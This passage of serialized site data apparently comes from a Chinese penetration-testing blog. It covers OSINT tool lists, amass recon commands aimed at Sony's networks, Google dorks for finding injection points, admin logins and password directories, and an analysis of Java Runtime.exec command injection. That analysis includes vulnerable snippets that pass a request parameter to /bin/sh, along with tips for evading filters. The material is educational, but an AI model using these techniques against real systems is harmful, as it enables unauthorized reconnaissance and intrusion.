class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/smicallef/spiderfoot&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;网页缓存\&quot;&gt;网页缓存&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#网页缓存\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://www.cachedpages.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://archive.org/web&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;图片反查\&quot;&gt;图片反查&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#图片反查\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;百度识图、googleimage、tineye&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;原图查询坐标&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;githubgitee等代码托管平台\&quot;&gt;Github/Gitee等代码托管平台&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#githubgitee等代码托管平台\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/dxa4481/truffleHog&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/lijiejie/GitHack&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/MiSecurity/x-patrol&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/az0ne/Github_Nuggests&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/0xbug/Hawkeye&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/mazen160/GithubCloner 克隆用户的github&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/michenriksen/gitrob.git&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;被入侵网址列表\&quot;&gt;被入侵网址列表&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#被入侵网址列表\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://zone-h.org/archive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wooyun镜像查找目标企业曾出现的漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://wooyun.2xss.cc/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;amass-深入的击面映射和资产发现\&quot;&gt;Amass 深入的击面映射和资产发现&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#amass-深入的击面映射和资产发现\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/OWASP/Amass &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -org &#39;Sony Corporation of America&#39;  #fetch ASN &amp;#x26; CIDR IP Range of a Company&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -active -asn 3725 -ip   #enumerate subdomains &amp;#x26; IP Address from ASN&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -active -asn 3725    #enumerate subdomains only from ASN &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -active -cidr 160.33.96.0/23   #enumerate subdomains from cidr rang&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -asn 3725 -whois -d sony.com   #enumerate subdomains using asn &amp;#x26; whois&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass enum -d sony.com -active -cidr 160.33.99.0/24,160.33.96.0/23 -asn 3725   #enumerate subdomains using cidr &amp;#x26; asn&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;威胁情报平台\&quot;&gt;威胁情报平台&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#威胁情报平台\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Virustotal：https://www.virustotal.com/gui/home/upload&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;腾讯哈勃分析系统：https://habo.qq.com/tool/index&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;微步在线威胁情报：https://x.threatbook.cn/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;奇安信威胁情报：https://ti.qianxin.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;360威胁情报：https://ti.360.net/#/homepage&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;安恒威胁情报：https://ti.dbappsecurity.com.cn/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;火线安全平台：https://www.huoxian.cn&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Hacking8安全信息流：https://i.hacking8.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;零零信安：https://0.zone&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;云信息&quot;],&quot;text&quot;:[0,&quot;云信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;app反编译&quot;],&quot;text&quot;:[0,&quot;APP反编译&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;c段b段信息&quot;],&quot;text&quot;:[0,&quot;C段/B段信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;工具&quot;],&quot;text&quot;:[0,&quot;工具&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;网页缓存&quot;],&quot;text&quot;:[0,&quot;网页缓存&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;图片反查&quot;],&quot;text&quot;:[0,&quot;图片反查&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;githubgitee等代码托管平台&quot;],&quot;text&quot;:[0,&quot;Github/Gitee等代码托管平台&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;被入侵网址列表&quot;],&quot;text&quot;:[0,&quot;被入侵网址列表&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;amass-深入的击面映射和资产发现&quot;],&quot;text&quot;:[0,&quot;Amass 深入的击面映射和资产发现&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;威胁情报平台&quot;],&quot;text&quot;:[0,&quot;威胁情报平台&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;一些情报源&quot;],&quot;date&quot;:[3,&quot;2026-01-18T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/18&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/google-hacking&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Google Hacking&quot;],&quot;date&quot;:[3,&quot;2026-01-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;],[0,&quot;google&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# **site:**\n\n功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容。\n\n示例：\n\nsite:zhihu.com 搜索跟知乎相关的网页\n\n“web安全” site:zhihu.com 搜索zhihu.com跟web安全相关的网页  \n&lt;br/&gt;“sql注入” site:csdn.net 搜索csdn.net跟sql注入相关的网页\n\n# **filetype:**\n\n功能：搜索指定文件类型\n\n示例：\n```\n“web安全” filetype:pdf 搜索跟web安全相关的pdf文件\nnmap filetye:ppt 搜索跟nmap相关的ppt文件\nsite:csdn.net filetype:pdf 搜索csdn网站中的pdf文件\nfiletype:pdf site:www.51cto.com 搜索51cto的pdf文件\n```\n\n# **inurl:**\n\n功能：搜索url网址存在特定关键字的网页，可以用来搜索有注入点的网站\n\n示例：\n\ninurl:.php?id= 搜索网址中有\&quot;.php?id=\&quot;的网页\n\ninurl:view.php=? 搜索网址中有\&quot;view.php=\&quot;的网页\n\n# **intitle:**\n\n功能：搜索正文存在关键字的网页\n\n示例：\n\nintitle:后台登陆搜索网页标题是\&quot;后台登陆\&quot;的网页\n\nintitle:后台登陆 filetype:php 搜索网页标题是\&quot;后台登录\&quot;的php网页\n\nintitle:index of “keyword”搜索keyword相关的索引目录信息\n\nintitle:index of “password”搜索密码相关的索引目录信息\n\nintitle:index of “login”搜索登陆页面信息\n\n\\*\\*\n\n# intext：\n\n\\*\\*\n\n功能：搜索正文中存在关键字的页面\n\n示例：\n\nintext:Powered by wordpress 搜索wordpress制作的博客网址\n\nintext:Powered by \\*CMS 搜索\\*CMS相关的网页\n\nintext:powered by xxx inurl:login 搜索此类网址的后台登陆页面\n\n查找条件可混用，例如：intitle:管理页面 intext:“忘记密码”\n\n### **cache**\n\n搜索搜索引擎里关于某些内容的缓存，可能会在过期内容里发现有价值的信息\n\n网页快照，谷歌将返回给你他存储下来的历史页面，如果你同时制定了其他查询词，将在搜索结果里以高亮显示，例如：cache:www.hackingspirits.com guest ，将返回指定网站的缓存，并且正文中含有guest&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/Google Hacking.md&quot;],&quot;digest&quot;:[0,&quot;476f56a824e08e39&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;site\&quot;&gt;&lt;strong&gt;site:&lt;/strong&gt;&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#site\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容。&lt;/p&gt;\n&lt;p&gt;示例：&lt;/p&gt;\n&lt;p&gt;site:zhihu.com 搜索跟知乎相关的网页&lt;/p&gt;\n&lt;p&gt;“web安全” site:zhihu.com 搜索zhihu.com跟web安全相关的网页&lt;br&gt;\n&lt;br&gt;“sql注入” site:csdn.net 搜索csdn.net跟sql注入相关的网页&lt;/p&gt;\n&lt;h1 id=\&quot;filetype\&quot;&gt;&lt;strong&gt;filetype:&lt;/strong&gt;&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#filetype\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;功能：搜索指定文件类型&lt;/p&gt;\n&lt;p&gt;示例：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;“web安全” filetype:pdf 搜索跟web安全相关的pdf文件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap filetye:ppt 搜索跟nmap相关的ppt文件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;site:csdn.net filetype:pdf 搜索csdn网站中的pdf文件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;filetype:pdf site:www.51cto.com 搜索51cto的pdf文件&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;inurl\&quot;&gt;&lt;strong&gt;inurl:&lt;/strong&gt;&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#inurl\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;功能：搜索url网址存在特定关键字的网页，可以用来搜索有注入点的网站&lt;/p&gt;\n&lt;p&gt;示例：&lt;/p&gt;\n&lt;p&gt;inurl:.php?id= 搜索网址中有”.php?id=“的网页&lt;/p&gt;\n&lt;p&gt;inurl:view.php=? 搜索网址中有”view.php=“的网页&lt;/p&gt;\n&lt;h1 id=\&quot;intitle\&quot;&gt;&lt;strong&gt;intitle:&lt;/strong&gt;&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#intitle\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;功能：搜索正文存在关键字的网页&lt;/p&gt;\n&lt;p&gt;示例：&lt;/p&gt;\n&lt;p&gt;intitle:后台登陆搜索网页标题是”后台登陆”的网页&lt;/p&gt;\n&lt;p&gt;intitle:后台登陆 filetype:php 搜索网页标题是”后台登录”的php网页&lt;/p&gt;\n&lt;p&gt;intitle:index of “keyword”搜索keyword相关的索引目录信息&lt;/p&gt;\n&lt;p&gt;intitle:index of “password”搜索密码相关的索引目录信息&lt;/p&gt;\n&lt;p&gt;intitle:index of “login”搜索登陆页面信息&lt;/p&gt;\n&lt;p&gt;**&lt;/p&gt;\n&lt;h1 id=\&quot;intext\&quot;&gt;intext：&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#intext\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;**&lt;/p&gt;\n&lt;p&gt;功能：搜索正文中存在关键字的页面&lt;/p&gt;\n&lt;p&gt;示例：&lt;/p&gt;\n&lt;p&gt;intext:Powered by wordpress 搜索wordpress制作的博客网址&lt;/p&gt;\n&lt;p&gt;intext:Powered by *CMS 搜索*CMS相关的网页&lt;/p&gt;\n&lt;p&gt;intext:powered by xxx inurl:login 搜索此类网址的后台登陆页面&lt;/p&gt;\n&lt;p&gt;查找条件可混用，例如：intitle:管理页面 intext:“忘记密码”&lt;/p&gt;\n&lt;h3 id=\&quot;cache\&quot;&gt;&lt;strong&gt;cache&lt;/strong&gt;&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#cache\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;搜索搜索引擎里关于某些内容的缓存，可能会在过期内容里发现有价值的信息&lt;/p&gt;\n&lt;p&gt;网页快照，谷歌将返回给你他存储下来的历史页面，如果你同时制定了其他查询词，将在搜索结果里以高亮显示，例如：cache:&lt;a href=\&quot;http://www.hackingspirits.com\&quot;&gt;www.hackingspirits.com&lt;/a&gt; guest ，将返回指定网站的缓存，并且正文中含有guest&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;site&quot;],&quot;text&quot;:[0,&quot;site:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;filetype&quot;],&quot;text&quot;:[0,&quot;filetype:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;inurl&quot;],&quot;text&quot;:[0,&quot;inurl:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;intitle&quot;],&quot;text&quot;:[0,&quot;intitle:&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;intext&quot;],&quot;text&quot;:[0,&quot;intext：&quot;]}],[0,{&quot;depth&quot;:[0,3],&quot;slug&quot;:[0,&quot;cache&quot;],&quot;text&quot;:[0,&quot;cache&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Google Hacking&quot;],&quot;date&quot;:[3,&quot;2026-01-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;],[0,&quot;google&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/14&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/java奇怪的命令执行&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;JAVA奇怪的命令执行&quot;],&quot;date&quot;:[3,&quot;2026-01-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;java&quot;],[0,&quot;漏洞&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# 前言\n首先Java下的命令执行大家都知道常见的两种方式：\n* 使用ProcessBuilder\n```\nProcessBuilder pb=new ProcessBuilder(cmd);\npb.start();\n```\n* 使用Runtime\n```\nRuntime.getRuntime().exec(cmd)\n```\n也就是说上面cmd参数可控的情况下，均存在命令执行的问题。但是话题回来，不太清楚大家是否遇到过java命令执行的时候，无论是windows还是linux环境下，带有|,&amp;lt;,&amp;gt;等符号的命令没办法正常执行。所以今天就进入底层看看这两个东西。\n\n# 差别\n先选择跟进\n```\nRuntime.getRuntime().exec(cmd)\n```\n样例代码如下所示：\n```java\nimport java.io.*;\n\npublic class Main {\n    public static void main(String[] arg) throws IOException {\n        String command=\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;;\n        Process proc = Runtime.getRuntime().exec(command);\n        InputStream in = proc.getInputStream();\n        BufferedReader br = new BufferedReader(new InputStreamReader(in, \&quot;UTF8\&quot;));\n        String line = null;\n        while((line=br.readLine())!=null) {\n            System.out.println(line);\n        }\n    }\n}\n```\n跟进 java.lang.Runtime#exec 的构造方法，这里要感谢phith0n师傅提出的疑问，让我补充完整这篇文章，下面话题回来，exec的构造方法有以下几种情况，其实根据传入的变量我们大概可以区分的了，一个是根据String command，也就是直接传入一个字符串。另一个是根据String cmdarray\\[\\]，也就是传入一个数组。\n\n```java\npublic Process exec(String command) throws IOException {        \n    return exec(command, null, null);\n    }\npublic Process exec(String command, String[] envp) throws IOException {        \n    return exec(command, envp, null);\n    }\npublic Process exec(String cmdarray[]) throws IOException {\n        return exec(cmdarray, null, null);\n     }\npublic Process exec(String[] cmdarray, String[] envp) throws IOException {        \n    return exec(cmdarray, envp, null);\n        }\n```\n\n而根据前面代码中，我们传入的命令是如下所示：\n```\nString command=\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;;\n```\n\n所以会进入\n```\nProcess exec(String command)\n```\n这个构造方法进行处理，跟进这个方法，发现最后返回\n```\nexec(command, null, null)\npublic Process exec(String command) throws IOException {        return exec(command, null, null);    }\n```\n继续跟进这个exec方法，看看这个方法的实现。这里代码实例化了StringTokenizer类，并且传入了我们要执行的command命令，简单翻译一下注释：为指定的字符串构造一个字符串标记器。也就是说StringTokenizer这个类会为特殊字符打上tag之类的东西。\n![](img/22.png)\n我们继续往下看，经过StringTokenizer类处理之后会返回一个cmdarray\\[\\]，而这里的处理实际上是根据空格针对命令进行了分割，至于为什么结果要是一个array数组，我们下面会接着说。\n\n![](img/23.png)\n我们发现经过一系列的处理，最后又有一个return exec 的处理。继续跟进这个exec的处理，我们可以看到这里最后实例化ProcessBuilder来处理我们传入的cmdarray。到这里实际上可以清楚了Runtime.getRuntime().exec()的底层实际上也是ProcessBuilder。\n```\npublic Process exec(String\\[\\] cmdarray, String\\[\\] envp, File dir)\n       throws IOException {\n       return new ProcessBuilder(cmdarray)\n          .environment(envp)\n           .directory(dir)\n           .start();\n   }\n```\n\n我们知道ProcessBuilder.start方法是命令执行，那么跟进这个start我们发现，首先prog获取cmdarray[0]也就是我们的/bin/sh，然后判断security是否为null，如果不为null就会校验checkExec。\n\n然后继续往下走，这里调用java.lang.ProcessImpl.start。\n\n进入之后我们就可以看到最后是调用java.lang.UnixProcess这个类来执行命令，而且我们发现执行命令的时候实际上是根据cmdarray[0]来判断用什么命令。而在java.lang.UnixProcess这个类里面是调用forkAndExec来为命令创建环境等操作。我们看到当前断点pid是2653，而这里确实起了一个sh的进程。\n\n这样看可能还不够明显，因为我们知道/bin/sh -c echo 111 &gt; 3.txt在bash命令行下也不会正常执行成功，命令行下需要/bin/sh -c \&quot;echo 111 &gt; 3.txt\&quot;，看这两段代码的命令执行的效果。\n```\nString\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;\n```\n首先先看\n`String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;`\n按照前面的分析，经过StringTokenizer这个类进行拆分之后变成了{\&quot;/bin/sh\&quot;,\&quot;-c\&quot;,\&quot;\&quot;echo\&quot;,\&quot;111\&quot;、\&quot;&gt;\&quot;,\&quot;3.txt\&quot;\&quot;}。\n\n而当前内存开辟一个12473进程，并且确实12473执行sh命令。\n\n但是我们发现，经过StringTokenizer这类拆分之后，命令完全变了一个味道，语义完全变了，并不是我们想要的结果，那我们再看看\n```\nString\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };\n```\n的结果。因为我们传入的是array数组类型，这里直接将命令直接带入了ProcessBuilder进行处理，前面完全没有经过StringTokenizer这个类的拆分。也就是他完整的保存了我想要的语义。\n\n也就是说getRuntime().exec()如果直接传入字符串会经过StringTokenizer的分割，进而破坏其原本想要表达的意思。\n\n下面这段代码是否存在命令执行的问题，要是在PHP下，我会斩钉截铁的说是，但是回到java环境下，我们发现 | 等一些特殊符号没办法使用，而且传入的是字符串，遇到空格会被StringTokenizer进行切割，所以实际上下面这段代码是没办法使用的。\n```\nString str = request.getParameter(\&quot;url\&quot;);\nString cmdstr = \&quot;ping \&quot;+ url;Runtime.getRuntime().exec(cmdstr)\n```\n再来一段代码，能够执行命令，但是很受限，我们知道命令根据cmdarray[0]来确认以什么命令环境启动，这里确实以/bin/sh启动了，但是后面的命令执行的时候存在问题，它仅能执行单条命令，拼接不了相关参数。\n```\nString str = request.getParameter(\&quot;cmd\&quot;);\nString cmdstr = \&quot;/bin/sh -c \&quot;+ cmd;Runtime.getRuntime().exec(cmdstr)\n```\n最后再来一段代码，下面这段代码才会是java下命令执行的完全体。\n```\nString str = request.getParameter(\&quot;cmd\&quot;);\nString\\[\\] cmdstr = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, str };Runtime.getRuntime().exec(cmdstr)\n```\n后面我翻到一篇文章，实际上也是差不多这个情况，实际上也是这个StringTokenizer这个类针对命令进行处理可能会造成非预期的结果。\n\n最后还有一个问题，为什么一定要将命令切割成为数组，原因是因为ProcessBuilder，看看他的构造方法。\n```\npublic ProcessBuilder(String... command) {        \n    this.command = new ArrayList&lt;&gt;(command.length);        \n    for (String arg : command)            \n    this.command.add(arg);\n   }\npublic ProcessBuilder(List&amp;lt;String&amp;gt; command) {\n    if (command == null)\n    throw new NullPointerException();\n    this.command = command;\n\n   }\n```\n实际上它是要求 Array 类型或者 List 类型，如果我们要执行下图中的代码是不行的。\n\n原因在于我们传入的类型不对，我们前面说过命令执行是根据cmdarray[0]，确认命令启动环境，这里自然找不到我们要启动的命令。\n\n所以Java下的命令稍微改造一下代码就好。\n\n还有一种方式就是用编码，linux下可以用bash的base64编码来解决这个特殊字符的问题。\n\n![](img/24.png)\n这里在小提一下如果遇到命令执行过滤了ProcessBuilder和getRuntime，可以考虑一下java.lang.ProcessImpl.start\n\n# 小结\n\n其实java已经尽量规避命令执行的安全问题，JDK沙盒机制会进行checkExec，执行命令的机制就是仅仅检查并执行命令数组中的第一个，而分隔符后面的所有东西都是默认为被执行程序的参数，而分隔符后面的所有东西都是默认为被执行程序的参数，这也是我们前文一直聊的内容。所以getRuntime().exec()通过传入字符串执行命令的时候，应该尽量避免使用空格，用了空格可能会改变这条命令本身想要表达的意思。\n\n所以在java下如果遇到复杂的命令执行，且参数只能如下所示，且只有一个位置可以控制的话，建议使用base64的编码方式，windows下可以使用powershell的base64。\n\njava的反序列化框架利用框架yso，以及一些shiro这类反序列化导致的命令执行实际上很多是用了getRuntime来达到命令执行的目的，且就像我们上面说的，可控位置比较固定，执行复杂命令会出现执行不了。&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/JAVA奇怪的命令执行.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/22.png&quot;],[0,&quot;img/23.png&quot;],[0,&quot;img/24.png&quot;]]],&quot;digest&quot;:[0,&quot;d35953b4d44114a7&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;前言\&quot;&gt;前言&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#前言\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;首先Java下的命令执行大家都知道常见的两种方式：&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;使用ProcessBuilder&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ProcessBuilder pb=new 